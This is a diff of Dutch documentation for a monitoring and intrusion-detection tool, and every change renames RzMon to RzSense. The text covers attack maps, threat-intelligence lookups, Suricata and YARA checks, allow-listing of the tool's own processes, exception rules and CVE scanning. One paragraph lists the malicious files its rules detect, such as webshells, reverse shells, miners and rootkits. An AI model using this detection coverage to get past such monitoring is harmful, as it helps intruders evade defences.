 - **Top 10 aanvallen** (vanaf 1.153.0): de grootste aanvallers van de gekozen periode in een tabel: aanvaller, doel en dienst, pogingen (met ▲ als hij nu bezig is), een trendlijntje en of het IDS hem geblokkeerd heeft.
-- **Wereldkaart**: de landen gekleurd naar het aantal pogingen, met bogen van het land van herkomst naar je eigen netwerk (het eerste land bij *Toegestane landen*, standaard Nederland). Het land is waar het IP-adres geregistreerd staat, niet de exacte plek. Klik op een land om alleen de aanvallen daarvandaan te zien. De kaart (Natural Earth, publiek domein) zit in RzMon zelf; er gaat niets naar een kaartdienst.
+- **Wereldkaart**: de landen gekleurd naar het aantal pogingen, met bogen van het land van herkomst naar je eigen netwerk (het eerste land bij *Toegestane landen*, standaard Nederland). Het land is waar het IP-adres geregistreerd staat, niet de exacte plek. Klik op een land om alleen de aanvallen daarvandaan te zien. De kaart (Natural Earth, publiek domein) zit in RzSense zelf; er gaat niets naar een kaartdienst.
 - **Klik op een aanvaller, dienst of afloop** voor de popup (vanaf 1.152.0): bovenaan *Kritiek/Waarschuwing*, waar het IP geblokkeerd is, *Waargenomen* of *Afgeleid* en hoeveel meldingen zijn samengevoegd, en **In het kort** in gewone taal ("probeerde 48 keer in te loggen op RL01. Er is niet ingelogd. Geblokkeerd op RL01 sinds 07:53."). Vier tabbladen:
   - **Overzicht**: aanvaller → dienst → doelwit, **pogingen per minuut** (of per 5 minuten, kwartier …) met de blokkade als groene streep, **waarom dit een aanval is** (waarom, trigger, actie), de laatste gebeurtenissen, waar het IP geblokkeerd is (tot wanneer, hoeveel tegengehouden) en **waar nog niet**, en de meldingen.
   - **Gebeurtenissen**: elke poging, login, einde van een sessie, bewijs (Suricata, de agent, een webverzoek), blokkade en melding: tijd, doel, bronpoort → poort, wat, door wie gezien en de status. Te filteren op pogingen, logins, bewijs en acties.
@@ -2933,13 +2935,13 @@ In één oogopslag: waar komt een aanval vandaan, welke server of welk apparaat 
   - Hetzelfde korte verhaal (in het kort, pogingen, blokkade, laatste gebeurtenissen) staat bovenaan het venster van **elk IDS-incident met een IP-adres**, met *Alles over dit IP*.
 - **Onder de kaart**: *Herkomst* per land en de *laatste aanvallen*.
 - Op het **dashboard** staat een klein kaartje *Aanvallen (24 uur)* met de wereldkaart en een link naar de aanvalskaart.
-- Poort en dienst komen uit wat RzMon al weet: SSH-aanvallen (22), webdiensten via SWAG, Home Assistant en Vaultwarden (443), de honeypot-poort, Suricata (bron- en doelpoort) en uitgaande verbindingen. Bij nieuwe incidenten worden ze opgeslagen; bij oudere worden ze afgeleid. Waar dat niet kan, staat *dienst onbekend*.
+- Poort en dienst komen uit wat RzSense al weet: SSH-aanvallen (22), webdiensten via SWAG, Home Assistant en Vaultwarden (443), de honeypot-poort, Suricata (bron- en doelpoort) en uitgaande verbindingen. Bij nieuwe incidenten worden ze opgeslagen; bij oudere worden ze afgeleid. Waar dat niet kan, staat *dienst onbekend*.
 - Op een telefoon staan de lijnen als lijst.
-- **Instellen:** *Instellingen → IDS → Endpoint-bewaking → 🧬 Afwijkingen en ketens*: afwijkingen aan/uit, de leerperiode, de score voor een incident, ketens aan/uit, het venster en of RzMon bij een keten ingrijpt.
+- **Instellen:** *Instellingen → IDS → Endpoint-bewaking → 🧬 Afwijkingen en ketens*: afwijkingen aan/uit, de leerperiode, de score voor een incident, ketens aan/uit, het venster en of RzSense bij een keten ingrijpt.
 
 **🌐 Dreigingsinformatie** (vanaf 1.112.0)
 
-RzMon vraagt na wat er op internet bekend is over de IP-adressen en bestanden uit je incidenten, en handelt ernaar. Instellen: *Instellingen → IDS → Dreigingsinformatie*.
+RzSense vraagt na wat er op internet bekend is over de IP-adressen en bestanden uit je incidenten, en handelt ernaar. Instellen: *Instellingen → IDS → Dreigingsinformatie*.
 
 - **Bronnen:**
   - **AbuseIPDB** (eigen API-sleutel, gratis, 1.000 opzoekingen per dag): hoe vaak een IP gemeld is, door hoeveel mensen, het soort netwerk en de provider. De sleutel maak je op [abuseipdb.com → Account → API](https://www.abuseipdb.com/account/api); plak hem in het veld **API-sleutel** en klik **Sleutel testen**.
@@ -2950,47 +2952,47 @@ RzMon vraagt na wat er op internet bekend is over de IP-adressen en bestanden ui
   - **Tor-uitgangen** (dagelijkse lijst van het Tor Project); als je wilt ook vooraf blokkeren.
 - **Wanneer:** bij elk nieuw IDS-incident met een IP van buiten, bij een nieuwe verbinding naar buiten (afwijking) en bij elk nieuw programma of script (hash). Het opzoeken gebeurt op de achtergrond (cron), met een cache van een dag (bestanden een week) en een limiet per dag. Er gaat alleen het IP-adres of de hash naar buiten.
 - **Oordeel:** een score van 0 tot 100 en een soort: ☠️ **bekende aanvaller** (vanaf 80, instelbaar), ⚠️ verdacht, 🤖 scanner, ✔ onschuldig (bekende dienst of onschuldige scanner), 🧅 Tor. Het staat bij het incident (*🌐 bekende aanvaller: AbuseIPDB 100% (523 meldingen van 210 mensen), GreyNoise: kwaadaardig*) en met alle details bij het IP-adres in het incidentvenster, met links naar AbuseIPDB, GreyNoise en Shodan.
-- **Wat RzMon ermee doet** (elk los aan/uit):
+- **Wat RzSense ermee doet** (elk los aan/uit):
   - een **bekende aanvaller blokkeren** (modus ⛔ Blokkeren);
   - een **login** vanaf een bekende aanvaller wordt **critical** (Pushover);
   - een **webaanval van een onschuldige scanner** (GreyNoise, bv. Shodan of Censys) wordt vanzelf afgehandeld;
-  - een **verbinding naar een botnet-server** (Feodo, ThreatFox of de andere lijsten) is meteen **critical**, zonder iets op te zoeken; in de modus Blokkeren stopt RzMon het proces;
+  - een **verbinding naar een botnet-server** (Feodo, ThreatFox of de andere lijsten) is meteen **critical**, zonder iets op te zoeken; in de modus Blokkeren stopt RzSense het proces;
   - een **bestand dat als malware bekend is** (MalwareBazaar) wordt een critical incident; een bekend goed bestand (CIRCL) krijgt *✔ bekend bestand* bij het incident;
   - een **webaanval op een lek dat de server echt heeft** (volgens de scan op *🐞 Kwetsbaarheden*, zonder geaccepteerd risico) is **critical**, met het pakket en de versie die het oplost.
-- **Melden bij AbuseIPDB** (standaard uit): wie RzMon automatisch blokkeert (brute force, webaanval, honeypot) gaat naar AbuseIPDB, hooguit één keer per dag per IP, met alleen het IP-adres, de soort aanval en de tekst *RzMon IDS*. Nooit adressen uit je eigen netwerk of van de whitelist.
+- **Melden bij AbuseIPDB** (standaard uit): wie RzSense automatisch blokkeert (brute force, webaanval, honeypot) gaat naar AbuseIPDB, hooguit één keer per dag per IP, met alleen het IP-adres, de soort aanval en de tekst *RzSense IDS*. Nooit adressen uit je eigen netwerk of van de whitelist.
 - Onderaan de kaart staat hoeveel er vandaag is opgezocht per bron, wanneer de lijsten zijn bijgewerkt (**Lijsten nu bijwerken**) en of een bron een fout gaf. Een bron die "te veel" (429) of "sleutel geweigerd" antwoordt, wordt een uur (bij 429 tot morgen) overgeslagen.
 
 **🧭 Netwerk: AdGuard, Suricata en YARA** (vanaf 1.113.0, agent 1.64.0)
 
 Instellen: *Instellingen → IDS → Dreigingsinformatie → 🧭 Netwerk*.
 
-- **DNS-controle via AdGuard Home** (standaard aan zodra AdGuard gekoppeld is, *Instellingen → Koppelingen → AdGuard*): elke minuut leest RzMon de nieuwe regels uit de query-log van al je AdGuard-instanties. Zo zie je **elk apparaat**, ook zonder agent (tv, camera's, IoT):
+- **DNS-controle via AdGuard Home** (standaard aan zodra AdGuard gekoppeld is, *Instellingen → Koppelingen → AdGuard*): elke minuut leest RzSense de nieuwe regels uit de query-log van al je AdGuard-instanties. Zo zie je **elk apparaat**, ook zonder agent (tv, camera's, IoT):
   - een domein dat bij **URLhaus** of **ThreatFox** als malware of botnet bekend is (ook subdomeinen): 🔴 critical als AdGuard het doorliet, 🟠 warning als AdGuard het tegenhield (het apparaat probeerde het wel);
   - een domein dat **AdGuard Safe Browsing** tegenhield (malware, phishing);
   - een antwoord dat naar een **bekende aanvaller** wijst (blocklists, ThreatFox);
   - een mogelijke **DNS-tunnel** (40 of meer lange, unieke namen onder één domein) en **verzonnen domeinen** (30 of meer willekeurige namen die niet bestaan): 🟠. CDN's, clouddiensten, omgekeerde DNS en Plex tellen niet mee.
-  - Het incident staat bij de server als het apparaat een van je servers is (dan telt het ook voor de ketens), anders bij RzMon zelf, met de naam van het apparaat uit AdGuard in de titel.
-  - Er gaat niets naar buiten: alles wordt vergeleken met de lijsten op de RzMon-server. De eerste keer legt RzMon alleen vast waar de log staat.
-- **Suricata** (agent 1.64.0): draait [Suricata](https://suricata.io) op een server, dan stuurt de agent de nieuwe alerts uit `/var/log/suricata/eve.json` mee (ander pad: `SURICATA_EVE=…`, uit: `SURICATA=0` in `/etc/default/rzmon-agent`). Ernst 1 wordt 🔴 critical, ernst 2 🟠 warning, ernst 3 alleen een signaal (Afwijkingen, MITRE). Bij ernst 1 van buiten blokkeert RzMon de aanvaller (modus Blokkeren, los uit te zetten). Elk alert krijgt een stap van een aanval (MITRE), zodat het meetelt in de ketens.
-- **YARA** (agent 1.64.0): staat `yara` op een server, dan controleert de agent elk nieuw bestand in de tijdelijke mappen en elk nieuw script in de webmappen met de YARA-regels van RzMon. Die regels stuurt RzMon zelf (versleuteld) naar de agent, en opnieuw als ze veranderen. Ze herkennen PHP- en JSP-webshells, cryptominers, reverse shells, IoT-botnets (Mirai, Gafgyt), Kinsing, LD_PRELOAD-rootkits en scripts die iets binnenhalen en starten (🔴), en ingepakte of sterk versleutelde bestanden (🟠). YARA installeer je via de Agent Manager (*⬇ Installeren via de agent*, optioneel) of zelf (`apt install yara`, op Rocky/Alma uit EPEL).
+  - Het incident staat bij de server als het apparaat een van je servers is (dan telt het ook voor de ketens), anders bij RzSense zelf, met de naam van het apparaat uit AdGuard in de titel.
+  - Er gaat niets naar buiten: alles wordt vergeleken met de lijsten op de RzSense-server. De eerste keer legt RzSense alleen vast waar de log staat.
+- **Suricata** (agent 1.64.0): draait [Suricata](https://suricata.io) op een server, dan stuurt de agent de nieuwe alerts uit `/var/log/suricata/eve.json` mee (ander pad: `SURICATA_EVE=…`, uit: `SURICATA=0` in `/etc/default/rzmon-agent`). Ernst 1 wordt 🔴 critical, ernst 2 🟠 warning, ernst 3 alleen een signaal (Afwijkingen, MITRE). Bij ernst 1 van buiten blokkeert RzSense de aanvaller (modus Blokkeren, los uit te zetten). Elk alert krijgt een stap van een aanval (MITRE), zodat het meetelt in de ketens.
+- **YARA** (agent 1.64.0): staat `yara` op een server, dan controleert de agent elk nieuw bestand in de tijdelijke mappen en elk nieuw script in de webmappen met de YARA-regels van RzSense. Die regels stuurt RzSense zelf (versleuteld) naar de agent, en opnieuw als ze veranderen. Ze herkennen PHP- en JSP-webshells, cryptominers, reverse shells, IoT-botnets (Mirai, Gafgyt), Kinsing, LD_PRELOAD-rootkits en scripts die iets binnenhalen en starten (🔴), en ingepakte of sterk versleutelde bestanden (🟠). YARA installeer je via de Agent Manager (*⬇ Installeren via de agent*, optioneel) of zelf (`apt install yara`, op Rocky/Alma uit EPEL).
 
-**✔ RzMon zelf: toegestaan** (vanaf 1.114.0, agent 1.65.0)
+**✔ RzSense zelf: toegestaan** (vanaf 1.114.0, agent 1.65.0)
 
-Wat RzMon zelf doet of veroorzaakt, houdt het IDS nooit tegen. Het wordt wel gelogd: als groene regel *✔ toegestaan* op *🛡️ IDS → 🛰️ Live*.
+Wat RzSense zelf doet of veroorzaakt, houdt het IDS nooit tegen. Het wordt wel gelogd: als groene regel *✔ toegestaan* op *🛡️ IDS → 🛰️ Live*.
 
-- **Wat telt als RzMon zelf:**
+- **Wat telt als RzSense zelf:**
   - **de agent** en alles wat hij start, ook verder door (commando-checks, zelf herstellen, bijwerken, pakketten installeren, YARA, de firewall). Herkend aan de systemd-groep `rzmon-*.service`, of (zonder systemd) aan een proces van root dat de agent is;
-  - **RzMon op zijn eigen server**: de webinterface, de API en de cron (PHP in de map van RzMon, als de gebruiker van de webserver of root), en wat die starten (zoals het opzoeken van een DNS-naam);
-  - **verkeer met RzMon**: de agent die naar RzMon rapporteert, en RzMon's checks en netwerkscan naar je servers (Suricata, de DNS-controle en de weblogs herkennen de adressen van RzMon).
-- **Nooit:** geen proces stoppen, niets blokkeren of isoleren, geen incident of Pushover, en het telt niet mee voor afwijkingen, ketens of dreigingsinformatie. De agent stopt bovendien zelf nooit een proces van RzMon, ook niet als RzMon daar om zou vragen.
+  - **RzSense op zijn eigen server**: de webinterface, de API en de cron (PHP in de map van RzSense, als de gebruiker van de webserver of root), en wat die starten (zoals het opzoeken van een DNS-naam);
+  - **verkeer met RzSense**: de agent die naar RzSense rapporteert, en RzSense's checks en netwerkscan naar je servers (Suricata, de DNS-controle en de weblogs herkennen de adressen van RzSense).
+- **Nooit:** geen proces stoppen, niets blokkeren of isoleren, geen incident of Pushover, en het telt niet mee voor afwijkingen, ketens of dreigingsinformatie. De agent stopt bovendien zelf nooit een proces van RzSense, ook niet als RzSense daar om zou vragen.
 - **In Live:** per rapport één groene regel per soort (*✔ toegestaan · agent 38 proces(sen), 4 verbinding(en)*). Klik erop voor de lijst. Een aparte groene regel krijgt:
-  - iets wat een regel geraakt zou hebben, met *zou … raken, maar is RzMon zelf*;
+  - iets wat een regel geraakt zou hebben, met *zou … raken, maar is RzSense zelf*;
   - iets bijzonders (pakketten installeren, een herstelcommando, bijwerken).
   - **Toegestaan tonen** zet de groene regels aan of uit.
-- **Veilig:** een programma dat zich "rzmon-agent" noemt maar van een gewone gebruiker is, telt niet als RzMon. Op de RzMon-server zelf telt PHP van de RzMon-gebruiker in de map van RzMon als RzMon; zet daar dus geen andere websites onder dezelfde gebruiker in die map.
+- **Veilig:** een programma dat zich "rzmon-agent" noemt maar van een gewone gebruiker is, telt niet als RzSense. Op de RzSense-server zelf telt PHP van de RzSense-gebruiker in de map van RzSense als RzSense; zet daar dus geen andere websites onder dezelfde gebruiker in die map.
 - **Betrouwbaarder herkend** (vanaf 1.132.0, agent 1.67.0):
-  - alles wat RzMon zelf start (DNS-namen opzoeken, ping, de netwerkscan, pakketlijsten), krijgt een **geheim kenmerk** in de opdracht (`: rzmon:•;`, doet niets). De agent herkent dat, en alles wat eruit voortkomt, als RzMon. Een andere webapp onder dezelfde gebruiker kent het kenmerk niet. In Live staat het kenmerk als `rzmon:•`, het echte kenmerk wordt nergens bewaard of getoond;
-  - de **cron van RzMon** (`crond → sh -c php …/cron/run.php`, als root of de gebruiker van de webserver);
+  - alles wat RzSense zelf start (DNS-namen opzoeken, ping, de netwerkscan, pakketlijsten), krijgt een **geheim kenmerk** in de opdracht (`: rzmon:•;`, doet niets). De agent herkent dat, en alles wat eruit voortkomt, als RzSense. Een andere webapp onder dezelfde gebruiker kent het kenmerk niet. In Live staat het kenmerk als `rzmon:•`, het echte kenmerk wordt nergens bewaard of getoond;
+  - de **cron van RzSense** (`crond → sh -c php …/cron/run.php`, als root of de gebruiker van de webserver);
   - wat een **run van de agent** start, ook als die run al klaar is wanneer de gebeurtenis binnenkomt (de agent onthoudt zijn laatste 8 PID's in `/var/cache/rzmon-agent/own.pids`). Voorheen kwamen het rapport van de agent (`curl`), zijn hardening-check (`grep … sudoers`) en het zoeken naar bestanden (`nice ionice find`) soms als Sigma-melding binnen.
 
 ### Uitzonderingen 🛡️ (vanaf 1.132.0)
@@ -3005,10 +3007,10 @@ Wat in een bepaalde situatie **normaal** is, zet je bij *Instellingen → IDS �
   - **Geldig**: altijd, of 1, 7 of 30 dagen; en een **reden**.
   - Bij elke uitzondering staat **hoe vaak** hij raak was en **wanneer** voor het laatst.
 - **Sets** (één knop voor een hele groep): *🔧 Systeemonderhoud* (pakketbeheer, kernel-updates met dracut, privé-tijdmappen van services, run-parts, logrotatie), *📦 Containers* (images ophalen), *🎬 Plex*, *☁️ Back-up naar de cloud* (rclone, restic, borg, kopia). Bij elke regel van een set zie je hoe vaak hij de laatste 30 dagen raak **zou** zijn. Na het toevoegen zet je regels los uit; **Weghalen** haalt de hele set weg.
-- **Voorstellen uit je meldingen**: wat de laatste 30 dagen vaak terugkwam (per regel, programma en ouder, of pad, adres of container), met **hoe vaak** en **op welke servers**. Wat 20× of vaker terugkwam, staat al aangevinkt; met **＋ Geselecteerde toevoegen** gaan ze in één keer. Niet voorgesteld: wat van RzMon of de agent zelf is, verdachte processen (in `/tmp`, `/dev/shm` of zonder bestand) en wijzigingen aan gevoelige bestanden (wachtwoorden, sudo, SSH-sleutels); die kunnen alleen met de hand.
+- **Voorstellen uit je meldingen**: wat de laatste 30 dagen vaak terugkwam (per regel, programma en ouder, of pad, adres of container), met **hoe vaak** en **op welke servers**. Wat 20× of vaker terugkwam, staat al aangevinkt; met **＋ Geselecteerde toevoegen** gaan ze in één keer. Niet voorgesteld: wat van RzSense of de agent zelf is, verdachte processen (in `/tmp`, `/dev/shm` of zonder bestand) en wijzigingen aan gevoelige bestanden (wachtwoorden, sudo, SSH-sleutels); die kunnen alleen met de hand.
 - **Nooit uit te zonderen**: malware (YARA), programma's in `/dev/shm` of verborgen mappen, lokaas, bekende kwade adressen (dreigingsinformatie), aanvallen op je webserver en ketens. Een uitzondering zonder voorwaarden ("alles") kan niet.
 - **Veilig**: aanmaken, aanzetten, een set of voorstellen toevoegen en importeren vraagt je **wachtwoord** (op je LAN zonder account: `UITZONDEREN`), en komt in het logboek. Uitzetten en weghalen mag zonder: dan wordt er juist weer gemeld.
-- **⇩ Exporteren / ⇧ Importeren** als JSON, bijvoorbeeld naar een tweede RzMon. Servers staan in het bestand op naam; wat op de andere RzMon niet bestaat, wordt overgeslagen.
+- **⇩ Exporteren / ⇧ Importeren** als JSON, bijvoorbeeld naar een tweede RzSense. Servers staan in het bestand op naam; wat op de andere RzSense niet bestaat, wordt overgeslagen.
 - *Dit is normaal* bij een incident blijft werken zoals altijd (alleen dat ene geval, op die server).
 - Andere monitoring (Home Assistant, Uptime Kuma …) zet je op de whitelist.
 
@@ -3024,7 +3026,7 @@ Wat in een bepaalde situatie **normaal** is, zet je bij *Instellingen → IDS �
 - **Bij elk incident** staan drie regels in het incidentvenster:
   - **Waarom**: de regel in gewone taal, met de drempel, en een link naar de kaart;
   - **Trigger**: de feiten die het deden afgaan (aantallen, IP, gebruiker, programma en opdracht, bestand, domein …);
-  - **Actie**: wat RzMon deed, met de stand van nu: *IP geblokkeerd tot …*, *IP was al geblokkeerd*, *proces 4242 wordt gestopt* → *gestopt ✔*, *server geïsoleerd tot …*, *gedeblokkeerd door …*, *blokkade verlopen*, *vanzelf afgehandeld*. In de modus Leren: *alleen gemeld (modus Leren; in Blokkeren: IP blokkeren)*.
+  - **Actie**: wat RzSense deed, met de stand van nu: *IP geblokkeerd tot …*, *IP was al geblokkeerd*, *proces 4242 wordt gestopt* → *gestopt ✔*, *server geïsoleerd tot …*, *gedeblokkeerd door …*, *blokkade verlopen*, *vanzelf afgehandeld*. In de modus Leren: *alleen gemeld (modus Leren; in Blokkeren: IP blokkeren)*.
   - In de lijst staat achter de titel een label met de actie (*🚫 geblokkeerd*, *⛔ gestopt*, *🧱 geïsoleerd*, *✔ afgehandeld*, *🎓 niet ingegrepen*).
   - **Pushover** krijgt dezelfde drie regels onder de titel.
   - Oude incidenten krijgen een eenvoudige versie, afgeleid uit het soort incident, de blokkades en de gestopte processen.
@@ -3052,12 +3054,12 @@ Wat in een bepaalde situatie **normaal** is, zet je bij *Instellingen → IDS �
 Welke software staat er op je servers, en welke bekende kwetsbaarheden (CVE's) horen daarbij? Standaard uit; aanzetten bij *Instellingen → 🐞 Kwetsbaarheden*. Daarna staat er een tabblad **🐞 Kwetsbaarheden** in de bovenbalk (voor beheerders en gebruikers, niet voor *alleen lezen*).
 
 **Hoe het werkt**
-- De agent (**1.47.0 of nieuwer**) stuurt zijn pakketlijst mee (`dpkg` of `rpm`, met de distributie uit `/etc/os-release`): de hele lijst één keer per dag, of eerder als er pakketten veranderen. Voor de RzMon-server zelf leest RzMon de lijst direct.
-- RzMon zoekt de kwetsbaarheden op bij **[OSV.dev](https://osv.dev)**. Daarin staan de beveiligingsadviezen van de distributies zelf (Debian, Ubuntu, Rocky Linux, AlmaLinux, Alpine). Zo telt een reparatie die de distributie in een "oud" versienummer heeft teruggezet (backport) niet als kwetsbaar. RHEL en CentOS gebruiken de adviezen van AlmaLinux (zelfde pakketten en versies).
+- De agent (**1.47.0 of nieuwer**) stuurt zijn pakketlijst mee (`dpkg` of `rpm`, met de distributie uit `/etc/os-release`): de hele lijst één keer per dag, of eerder als er pakketten veranderen. Voor de RzSense-server zelf leest RzSense de lijst direct.
+- RzSense zoekt de kwetsbaarheden op bij **[OSV.dev](https://osv.dev)**. Daarin staan de beveiligingsadviezen van de distributies zelf (Debian, Ubuntu, Rocky Linux, AlmaLinux, Alpine). Zo telt een reparatie die de distributie in een "oud" versienummer heeft teruggezet (backport) niet als kwetsbaar. RHEL en CentOS gebruiken de adviezen van AlmaLinux (zelfde pakketten en versies).
 - Naar OSV.dev gaan alleen **pakketnamen, versies en de distributie**, geen servernamen of IP-adressen.
 - Daarnaast: **⚠️ actief misbruikt** (de lijst *Known Exploited Vulnerabilities* van CISA, dagelijks), de **kans op misbruik** (EPSS van FIRST.org) en zo nodig de **CVSS-score** van NVD.
-- RzMon scant elke dag op het ingestelde tijdstip (standaard 03:30), en meteen als de pakketlijst van een server verandert. Met **🔍 Nu scannen** start je het zelf.
-- Nodig op de RzMon-server: uitgaand HTTPS naar `api.osv.dev`, `www.cisa.gov`, `api.first.org` en `services.nvd.nist.gov`. Kan dat niet, dan staat bij de server *OSV.dev niet bereikbaar*.
+- RzSense scant elke dag op het ingestelde tijdstip (standaard 03:30), en meteen als de pakketlijst van een server verandert. Met **🔍 Nu scannen** start je het zelf.
+- Nodig op de RzSense-server: uitgaand HTTPS naar `api.osv.dev`, `www.cisa.gov`, `api.first.org` en `services.nvd.nist.gov`. Kan dat niet, dan staat bij de server *OSV.dev niet bereikbaar*.
 
 **De pagina** (vanaf 1.67.0 in dezelfde opbouw als het dashboard)
 - Bovenaan de **tellers** (Critical, High, Medium, Low, Onbekend, ⚠️ Actief misbruikt), klikbaar: *critical/high/medium* = vanaf die ernst, *actief misbruikt* = dat filter.
@@ -3074,8 +3076,8 @@ Welke software staat er op je servers, en welke bekende kwetsbaarheden (CVE's) h
 
 **Bijwerken via de agent** (beheerders)
 - Met **⬆** bij een pakket, of **⬆ Alle beveiligingsupdates installeren** bij een server, voert de agent bij zijn volgende rapport `dnf upgrade` of `apt-get install --only-upgrade` uit voor precies die pakketten. Je bevestigt met je wachtwoord (op het LAN zonder wachtwoord: typ **BIJWERKEN**); het komt in het logboek, en de uitkomst (met de uitvoer) zie je bij de server.
-- **Voortgang:** na **⬆ Bijwerken** blijft een venster open met een **voortgangsring** en een tijdlijn van de stappen (vanaf 1.204.0 in dezelfde opmaak als RzMon bijwerken) *Wachten op de agent → Pakketlijst ophalen → Downloaden → Installeren → Klaar*. Daaronder staat waar de server nu mee bezig is (bv. *Installeren: **openssl***, bij dnf ook *(3/14)*) en de laatste regels van de uitvoer van apt of dnf. Met **Op de achtergrond** sluit je het venster; bij de server staat dan *⏳ Bezig met bijwerken 45%*, en een klik daarop opent het weer. Dit vraagt **agent 1.48.0** of nieuwer: die meldt elke paar seconden zijn voortgang en de uitkomst meteen. Een oudere agent werkt ook, maar dan zie je een bewegende balk zonder percentage en komt de uitkomst bij zijn volgende rapport.
-- **Daarna:** de agent stuurt bij zijn volgende rapport de nieuwe softwarelijst en RzMon **scant de server meteen opnieuw**; het venster laat zien wanneer dat klaar is. Je krijgt ook een ℹ️ info-melding *Pakketten bijgewerkt* of *Pakketten bijwerken mislukt* (met de laatste regel van de uitvoer), volgens de rij **Info** bij *🔔 Meldingen*.
+- **Voortgang:** na **⬆ Bijwerken** blijft een venster open met een **voortgangsring** en een tijdlijn van de stappen (vanaf 1.204.0 in dezelfde opmaak als RzSense bijwerken) *Wachten op de agent → Pakketlijst ophalen → Downloaden → Installeren → Klaar*. Daaronder staat waar de server nu mee bezig is (bv. *Installeren: **openssl***, bij dnf ook *(3/14)*) en de laatste regels van de uitvoer van apt of dnf. Met **Op de achtergrond** sluit je het venster; bij de server staat dan *⏳ Bezig met bijwerken 45%*, en een klik daarop opent het weer. Dit vraagt **agent 1.48.0** of nieuwer: die meldt elke paar seconden zijn voortgang en de uitkomst meteen. Een oudere agent werkt ook, maar dan zie je een bewegende balk zonder percentage en komt de uitkomst bij zijn volgende rapport.
+- **Daarna:** de agent stuurt bij zijn volgende rapport de nieuwe softwarelijst en RzSense **scant de server meteen opnieuw**; het venster laat zien wanneer dat klaar is. Je krijgt ook een ℹ️ info-melding *Pakketten bijgewerkt* of *Pakketten bijwerken mislukt* (met de laatste regel van de uitvoer), volgens de rij **Info** bij *🔔 Meldingen*.
 - Dat kan alleen als **commando's als root** aan staan voor die server (*Instellingen → 🖥️ Commando-checks*, of per server in de Agent Manager) en de agent als root draait. Op de server zelf blokkeer je het altijd met `COMMANDS=0` of `COMMANDS=nobody` in `/etc/default/rzmon-agent`. Kan het niet, dan krijg je het commando om zelf uit te voeren.
 - Er wordt nooit iets herstart. De pakketnamen worden aan beide kanten gecontroleerd; vrije commando's zijn niet mogelijk.
 
@@ -3092,20 +3094,20 @@ Welke software staat er op je servers, en welke bekende kwetsbaarheden (CVE's) h
 
 Vanaf **70** is het rood: **🔥 Hoog risico** (ook als filter), vanaf 40 oranje. Een critical CVE in een pakket dat niet op het netwerk luistert en niet misbruikt wordt, kan dus lager staan dan een high die bereikbaar is en actief misbruikt wordt.
 
-**Gecontroleerd na bijwerken** (vanaf 1.141.0): na *⬆ Bijwerken via de agent* kijkt de eerste scan met de nieuwe softwarelijst wat er **echt** opgelost is. Bij de server staat dan bijvoorbeeld *🔎 gecontroleerd: 4 kwetsbaarheden opgelost*, of *nog open in openssh* als een bijgewerkt pakket nog een CVE heeft die een nieuwere versie oplost. Wat bij een scan verdwijnt (ook als je zelf bijwerkt) telt mee in **Opgelost (30 dagen)** bovenaan en *✔ 3 opgelost in 30 dagen* bij de server; RzMon bewaart dat een half jaar.
+**Gecontroleerd na bijwerken** (vanaf 1.141.0): na *⬆ Bijwerken via de agent* kijkt de eerste scan met de nieuwe softwarelijst wat er **echt** opgelost is. Bij de server staat dan bijvoorbeeld *🔎 gecontroleerd: 4 kwetsbaarheden opgelost*, of *nog open in openssh* als een bijgewerkt pakket nog een CVE heeft die een nieuwere versie oplost. Wat bij een scan verdwijnt (ook als je zelf bijwerkt) telt mee in **Opgelost (30 dagen)** bovenaan en *✔ 3 opgelost in 30 dagen* bij de server; RzSense bewaart dat een half jaar.
 
 **SBOM** (vanaf 1.141.0): met **⤓ SBOM** bij een server download je de softwarelijst met de bekende kwetsbaarheden als **CycloneDX 1.5** (JSON). Elk pakket staat erin als *purl* (bv. `pkg:deb/debian/libssl3@3.0.11-1?arch=amd64&distro=debian-12&upstream=openssl`), met per kwetsbaarheid de ernst, CVSS, KEV, EPSS en de versie die het oplost. Dat bestand lezen andere scanners en **Dependency-Track**.
 
 **Meldingen**: bij een **nieuwe critical of actief misbruikte** kwetsbaarheid komt er één ℹ️ info-melding per server (*"ℹ️ INFO: WebServer01 – 2 nieuwe kwetsbaarheden: CVE-… (openssh, critical, actief misbruikt) · …"*). Die volgt de rij **Info** bij *🔔 Meldingen* (standaard uit).
 
-**REST API en Home Assistant**: `GET /v1.php/vulnerabilities` (tellers per server) en `GET /v1.php/vulnerabilities/{id}` (de kwetsbaarheden van een server), met het nieuwe recht *🐞 Kwetsbaarheden lezen*. Via MQTT krijgt elke server de sensoren *Kwetsbaarheden critical*, *high* en *actief misbruikt*, en RzMon de totalen.
+**REST API en Home Assistant**: `GET /v1.php/vulnerabilities` (tellers per server) en `GET /v1.php/vulnerabilities/{id}` (de kwetsbaarheden van een server), met het nieuwe recht *🐞 Kwetsbaarheden lezen*. Via MQTT krijgt elke server de sensoren *Kwetsbaarheden critical*, *high* en *actief misbruikt*, en RzSense de totalen.
 
 **Instellingen → 🐞 Kwetsbaarheden** (in de groep *📈 Monitoring*, onder 🛡️ IDS): aan/uit, de scantijd, *tonen vanaf* (ernst) en welke servers niet gescand worden.
 
 **Nog niet**: de Home Assistant-add-on, Podman-containers, en software die niet via de pakketbeheerder is geïnstalleerd (zelf gecompileerd, pip, npm…). Fedora en openSUSE worden nog niet ondersteund.
 
 #### Rugbaarheid, Raakt dit jou echt? en Eén update, veel opgelost 🔥 (vanaf 1.179.0)
-**Rugbaarheid** is een score van 0 tot 100: hoeveel aandacht krijgt een kwetsbaarheid, en wordt hij al misbruikt? RzMon berekent hem alleen voor de CVE's die op je servers staan, één keer per dag (actief misbruikt of high/critical: twee keer).
+**Rugbaarheid** is een score van 0 tot 100: hoeveel aandacht krijgt een kwetsbaarheid, en wordt hij al misbruikt? RzSense berekent hem alleen voor de CVE's die op je servers staan, één keer per dag (actief misbruikt of high/critical: twee keer).
 
 | Deel | Bronnen | Punten |
 |---|---|---|
@@ -3117,30 +3119,30 @@ Vanaf **70** is het rood: **🔥 Hoog risico** (ook als filter), vanaf 40 oranje
 - In de lijst staat een **🔥 met de score** bij een CVE boven de grens; het filter **🔥 Veel aandacht** laat alleen die zien.
 - **Melding**: passeert een CVE de grens (standaard 60) of stijgt hij snel (+15 in 7 dagen), dan krijg je per server een ℹ️-melding, hooguit eens per 14 dagen.
 - **Instellen** bij *Instellingen → Kwetsbaarheden → Rugbaarheid en exploits*:
-  - **GitHub-token**: optioneel. Zonder token zoekt RzMon er 6 per minuut, met token 20. Maak een *fine-grained token* zonder rechten (alleen publieke repositories).
-  - **Mastodon**: zonder token telt RzMon de hashtag (bijvoorbeeld `#CVE20243094`) op de instantie die je kiest (standaard infosec.exchange). Met een token (alleen lezen) telt hij ook berichten zonder hashtag.
